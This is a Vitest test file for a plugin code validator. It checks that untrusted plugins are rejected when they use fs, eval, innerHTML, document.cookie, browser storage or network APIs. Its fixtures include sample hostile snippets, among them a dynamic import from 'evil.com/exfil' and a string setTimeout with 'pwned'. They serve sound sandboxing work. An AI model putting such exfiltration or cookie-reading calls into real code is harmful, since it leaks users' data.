import { describe, expect, it } from 'vitest';
import { validatePluginAst } from '../astValidator';

describe('validatePluginAst', () => {
  it('accepts compiled plugin code with a default export and allowed requires', () => {
    const code = `
var React = require("react");
var ui = require("@rebel/plugin-ui");
function Plugin() {
  return ui.Card;
}
exports.default = Plugin;
`;

    const errors = validatePluginAst(code, code);

    expect(errors).toEqual([]);
  });

  it('rejects code without a default export', () => {
    const code = `
var React = require("react");
const value = 42;
`;

    const errors = validatePluginAst(code, code);

    expect(errors.some((error) => error.message.includes('default export'))).toBe(true);
  });

  it('rejects disallowed require modules', () => {
    const code = `
var fs = require("fs");
exports.default = function Plugin() {
  return fs;
};
`;

    const errors = validatePluginAst(code, code);

    expect(errors.some((error) => error.message.includes('Disallowed require() module "fs"'))).toBe(
      true,
    );
  });

  it('rejects dynamic require expressions', () => {
    const code = `
const moduleName = "react";
var React = require(moduleName);
exports.default = React;
`;

    const errors = validatePluginAst(code, code);

    expect(
      errors.some((error) =>
        error.message.includes('require() must use a static string literal module specifier.'),
      ),
    ).toBe(true);
  });

  it('rejects forbidden patterns', () => {
    const code = `
exports.default = function Plugin(element) {
  eval("2 + 2");
  document.write("oops");
  element.innerHTML = "<div />";
};
`;

    const errors = validatePluginAst(code, code);

    expect(errors.some((error) => error.message.includes('eval() is not allowed'))).toBe(true);
    expect(errors.some((error) => error.message.includes('document.write() is not allowed'))).toBe(
      true,
    );
    expect(errors.some((error) => error.message.includes('innerHTML is not allowed'))).toBe(
      true,
    );
  });

  it('rejects document.writeln()', () => {
    const code = `
exports.default = function Plugin() {
  document.writeln("oops");
  return null;
};
`;
    const errors = validatePluginAst(code, code);
    expect(errors.some(e => e.message.includes('document.writeln() is not allowed'))).toBe(true);
  });

  it('rejects outerHTML access', () => {
    const code = `
exports.default = function Plugin(element) {
  element.outerHTML = "<div />";
};
`;
    const errors = validatePluginAst(code, code);
    expect(errors.some(e => e.message.includes('outerHTML is not allowed'))).toBe(true);
  });

  it('rejects insertAdjacentHTML access', () => {
    const code = `
exports.default = function Plugin(element) {
  element.insertAdjacentHTML("beforeend", "<div />");
};
`;
    const errors = validatePluginAst(code, code);
    expect(errors.some(e => e.message.includes('insertAdjacentHTML is not allowed'))).toBe(true);
  });

  it('rejects Function constructor (eval equivalent)', () => {
    const code = `
exports.default = function Plugin() {
  const fn = Function("return 1+1");
  return fn();
};
`;
    const errors = validatePluginAst(code, code);
    expect(errors.some(e => e.message.includes('Function()'))).toBe(true);
  });

  it('rejects setTimeout with string argument', () => {
    const code = `
exports.default = function Plugin() {
  setTimeout("alert('pwned')", 0);
  return null;
};
`;
    const errors = validatePluginAst(code, code);
    expect(errors.some(e => e.message.includes('setTimeout'))).toBe(true);
  });

  it('includes fullSource on validation errors', () => {
    const source = 'var fs = require("fs");';

    const errors = validatePluginAst(source, source);

    expect(errors.length).toBeGreaterThan(0);
    expect(errors[0].fullSource).toBe(source);
  });

  // Layer 1: API surface lockdown — forbidden global identifiers
  describe('Layer 1: API surface lockdown', () => {
    it('rejects globalThis access', () => {
      const code = `
exports.default = function Plugin() {
  var x = globalThis.something;
  return null;
};
`;
      const errors = validatePluginAst(code, code);
      expect(errors.some(e => e.message.includes('globalThis is not allowed'))).toBe(true);
    });

    it('rejects window access', () => {
      const code = `
exports.default = function Plugin() {
  var x = window.location;
  return null;
};
`;
      const errors = validatePluginAst(code, code);
      expect(errors.some(e => e.message.includes('window is not allowed'))).toBe(true);
    });

    it('rejects self access', () => {
      const code = `
exports.default = function Plugin() {
  var x = self.postMessage;
  return null;
};
`;
      const errors = validatePluginAst(code, code);
      expect(errors.some(e => e.message.includes('self is not allowed'))).toBe(true);
    });

    it('rejects localStorage', () => {
      const code = `
exports.default = function Plugin() {
  localStorage.setItem("key", "value");
  return null;
};
`;
      const errors = validatePluginAst(code, code);
      expect(errors.some(e => e.message.includes('localStorage is not allowed'))).toBe(true);
    });

    it('rejects sessionStorage', () => {
      const code = `
exports.default = function Plugin() {
  sessionStorage.getItem("key");
  return null;
};
`;
      const errors = validatePluginAst(code, code);
      expect(errors.some(e => e.message.includes('sessionStorage is not allowed'))).toBe(true);
    });

    it('rejects indexedDB', () => {
      const code = `
exports.default = function Plugin() {
  var db = indexedDB.open("mydb");
  return null;
};
`;
      const errors = validatePluginAst(code, code);
      expect(errors.some(e => e.message.includes('indexedDB is not allowed'))).toBe(true);
    });

    it('rejects document.cookie', () => {
      const code = `
exports.default = function Plugin() {
  var c = document.cookie;
  return null;
};
`;
      const errors = validatePluginAst(code, code);
      expect(errors.some(e => e.message.includes('document.cookie is not allowed'))).toBe(true);
    });

    it('allows property access named same as forbidden globals', () => {
      const code = `
exports.default = function Plugin() {
  var obj = {};
  var x = obj.window;
  var y = obj.self;
  return null;
};
`;
      const errors = validatePluginAst(code, code);
      expect(errors.filter(e => e.message.includes('window is not allowed'))).toHaveLength(0);
      expect(errors.filter(e => e.message.includes('self is not allowed'))).toHaveLength(0);
    });
  });

  // Layer 3: Static network restrictions
  describe('Layer 3: Static network restrictions', () => {
    it('rejects fetch()', () => {
      const code = `
exports.default = function Plugin() {
  fetch("https://example.com");
  return null;
};
`;
      const errors = validatePluginAst(code, code);
      expect(errors.some(e => e.message.includes('fetch()'))).toBe(true);
    });

    it('rejects XMLHttpRequest', () => {
      const code = `
exports.default = function Plugin() {
  var xhr = new XMLHttpRequest();
  return null;
};
`;
      const errors = validatePluginAst(code, code);
      expect(errors.some(e => e.message.includes('XMLHttpRequest is not allowed'))).toBe(true);
    });

    it('rejects WebSocket', () => {
      const code = `
exports.default = function Plugin() {
  var ws = new WebSocket("ws://example.com");
  return null;
};
`;
      const errors = validatePluginAst(code, code);
      expect(errors.some(e => e.message.includes('WebSocket is not allowed'))).toBe(true);
    });

    it('rejects EventSource', () => {
      const code = `
exports.default = function Plugin() {
  var es = new EventSource("/events");
  return null;
};
`;
      const errors = validatePluginAst(code, code);
      expect(errors.some(e => e.message.includes('EventSource is not allowed'))).toBe(true);
    });

    it('rejects navigator.sendBeacon', () => {
      const code = `
exports.default = function Plugin() {
  navigator.sendBeacon("/track", "data");
  return null;
};
`;
      const errors = validatePluginAst(code, code);
      expect(errors.some(e => e.message.includes('navigator.sendBeacon()'))).toBe(true);
    });

    it('rejects dynamic import()', () => {
      const code = `
exports.default = function Plugin() {
  import("https://evil.com/exfil").then(function() {});
  return null;
};
`;
      const errors = validatePluginAst(code, code);
      expect(errors.some(e => e.message.includes('Dynamic import() is not allowed'))).toBe(true);
    });

    it('allows navigator property access that is not sendBeacon', () => {
      const code = `
exports.default = function Plugin() {
  var lang = navigator.language;
  return null;
};
`;
      const errors = validatePluginAst(code, code);
      expect(errors.filter(e => e.message.includes('navigator'))).toHaveLength(0);
    });
  });
});
